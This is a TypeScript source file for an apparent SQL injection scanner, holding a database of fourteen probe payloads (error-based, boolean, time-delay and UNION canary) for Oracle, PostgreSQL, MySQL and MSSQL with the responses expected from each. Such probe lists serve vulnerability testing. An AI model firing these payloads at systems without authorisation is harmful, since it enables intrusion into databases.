import { PayloadResearchItem, InjectionContext, DbmsType } from '../../types/sqlScanner';

export class PayloadDatabase {
  public static RESEARCH_VERSION = '2026.3-PRO';

  private static ITEMS: PayloadResearchItem[] = [
    // ----------------------------------------------------
    // 1. Error-Based Precision Probes
    // ----------------------------------------------------
    {
      id: 'ERR_GEN_001',
      name: 'Single Quote Delimiter',
      dbms: 'Generic SQL',
      context: 'single_quote_string',
      technique: 'Error-based',
      payload: "'",
      expectedBehavior: 'Unclosed quotation mark or syntax error near quote',
      negativeBehavior: 'Normal status code 200 without error signatures',
      riskLevel: 'Safe',
    },
    {
      id: 'ERR_GEN_002',
      name: 'Double Quote Delimiter',
      dbms: 'Generic SQL',
      context: 'double_quote_string',
      technique: 'Error-based',
      payload: '"',
      expectedBehavior: 'Unclosed string or identifier syntax error',
      negativeBehavior: 'Normal response body',
      riskLevel: 'Safe',
    },
    {
      id: 'ERR_GEN_003',
      name: 'Parenthesis & Quote Breakout',
      dbms: 'Generic SQL',
      context: 'parenthesized_string',
      technique: 'Error-based',
      payload: "')",
      expectedBehavior: 'Mismatched parenthesis or parser error',
      negativeBehavior: 'Identical baseline response',
      riskLevel: 'Safe',
    },
    {
      id: 'ERR_ORA_001',
      name: 'Oracle Unterminated String (ORA-01756)',
      dbms: 'Oracle',
      context: 'single_quote_string',
      technique: 'Error-based',
      payload: "'||(SELECT '' FROM DUAL)||'",
      expectedBehavior: 'Oracle SQL execution or ORA-01756 error',
      negativeBehavior: 'No ORA signatures',
      riskLevel: 'Safe',
    },
    {
      id: 'ERR_PG_001',
      name: 'Postgres Cast Syntax Error',
      dbms: 'PostgreSQL',
      context: 'numeric',
      technique: 'Error-based',
      payload: '::int',
      expectedBehavior: 'Postgres type cast or syntax error at or near ::',
      negativeBehavior: 'Normal query behavior',
      riskLevel: 'Safe',
    },

    // ----------------------------------------------------
    // 2. Boolean-Based Differential Pairs
    // ----------------------------------------------------
    {
      id: 'BOOL_STR_001',
      name: 'Single Quote String Equality Pair',
      dbms: 'Generic SQL',
      context: 'single_quote_string',
      technique: 'Boolean-based',
      payload: "' AND '1'='1",
      expectedBehavior: 'TRUE response identical to baseline',
      negativeBehavior: 'FALSE response diverges significantly',
      riskLevel: 'Safe',
    },
    {
      id: 'BOOL_NUM_001',
      name: 'Numeric AND Logic Pair',
      dbms: 'Generic SQL',
      context: 'numeric',
      technique: 'Boolean-based',
      payload: ' AND 1337=1337',
      expectedBehavior: 'Normal baseline output on TRUE condition',
      negativeBehavior: 'Empty or different content on FALSE condition (AND 1337=1338)',
      riskLevel: 'Safe',
    },
    {
      id: 'BOOL_ORA_001',
      name: 'Oracle DUAL Table Verification',
      dbms: 'Oracle',
      context: 'single_quote_string',
      technique: 'Boolean-based',
      payload: "' AND (SELECT 1 FROM DUAL)=1 AND '1'='1",
      expectedBehavior: 'Oracle DUAL evaluates TRUE without altering response',
      negativeBehavior: 'Evaluates FALSE if non-Oracle',
      riskLevel: 'Safe',
    },
    {
      id: 'BOOL_PG_001',
      name: 'PostgreSQL Cast Equality Test',
      dbms: 'PostgreSQL',
      context: 'single_quote_string',
      technique: 'Boolean-based',
      payload: "' AND 5::text=5::text AND 'a'='a",
      expectedBehavior: 'Evaluates TRUE on PostgreSQL database engines',
      negativeBehavior: 'Fails syntax on non-Postgres engines',
      riskLevel: 'Safe',
    },

    // ----------------------------------------------------
    // 3. Time-Based Blind Delay Probes
    // ----------------------------------------------------
    {
      id: 'TIME_ORA_001',
      name: 'Oracle dbms_pipe.receive_message Delay',
      dbms: 'Oracle',
      context: 'single_quote_string',
      technique: 'Time-based',
      payload: "'||(SELECT dbms_pipe.receive_message(('RDS'),3) FROM DUAL)||'",
      expectedBehavior: 'Server execution pauses for ~3 seconds',
      negativeBehavior: 'Immediate response < baseline median + 500ms',
      riskLevel: 'Probe',
    },
    {
      id: 'TIME_PG_001',
      name: 'PostgreSQL pg_sleep Delay',
      dbms: 'PostgreSQL',
      context: 'single_quote_string',
      technique: 'Time-based',
      payload: "'||(SELECT pg_sleep(3))||'",
      expectedBehavior: 'Server pauses execution for 3 seconds',
      negativeBehavior: 'Immediate response',
      riskLevel: 'Probe',
    },
    {
      id: 'TIME_MYS_001',
      name: 'MySQL SLEEP() Delay',
      dbms: 'MySQL',
      context: 'single_quote_string',
      technique: 'Time-based',
      payload: "' AND (SELECT 1 FROM (SELECT(SLEEP(3)))snt)-- -",
      expectedBehavior: 'Execution delay of ~3000ms',
      negativeBehavior: 'Immediate response',
      riskLevel: 'Probe',
    },
    {
      id: 'TIME_MSS_001',
      name: 'MSSQL WAITFOR DELAY',
      dbms: 'Microsoft SQL Server',
      context: 'single_quote_string',
      technique: 'Time-based',
      payload: "'; WAITFOR DELAY '0:0:3'--",
      expectedBehavior: 'Execution delay of 3 seconds',
      negativeBehavior: 'Immediate response',
      riskLevel: 'Probe',
    },

    // ----------------------------------------------------
    // 4. UNION & ORDER BY Adaptive Column Probes
    // ----------------------------------------------------
    {
      id: 'ORD_GEN_001',
      name: 'ORDER BY Column Discovery',
      dbms: 'Generic SQL',
      context: 'single_quote_string',
      technique: 'ORDER BY Injection',
      payload: "' ORDER BY 1-- -",
      expectedBehavior: 'Response valid while column exists, errors/diverges when exceeded',
      negativeBehavior: 'Error on index > actual column count',
      riskLevel: 'Safe',
    },
    {
      id: 'UNION_CANARY_001',
      name: 'Harmless Canary Reflection',
      dbms: 'Generic SQL',
      context: 'single_quote_string',
      technique: 'UNION-based',
      payload: "' UNION SELECT 'SENTINEL_CANARY_01'-- -",
      expectedBehavior: 'Reflection of SENTINEL_CANARY_01 in response body',
      negativeBehavior: 'No canary token rendered',
      riskLevel: 'Safe',
    },
  ];

  public static getPayloads(options?: {
    dbms?: DbmsType;
    context?: InjectionContext;
    technique?: string;
  }): PayloadResearchItem[] {
    return PayloadDatabase.ITEMS.filter((item) => {
      if (options?.dbms && options.dbms !== 'Generic SQL' && item.dbms !== 'Generic SQL' && item.dbms !== options.dbms) {
        return false;
      }
      if (options?.context && item.context !== options.context && item.context !== 'single_quote_string') {
        return false;
      }
      if (options?.technique && item.technique !== options.technique) {
        return false;
      }
      return true;
    });
  }

  public static getAllPayloads(): PayloadResearchItem[] {
    return [...PayloadDatabase.ITEMS];
  }
}
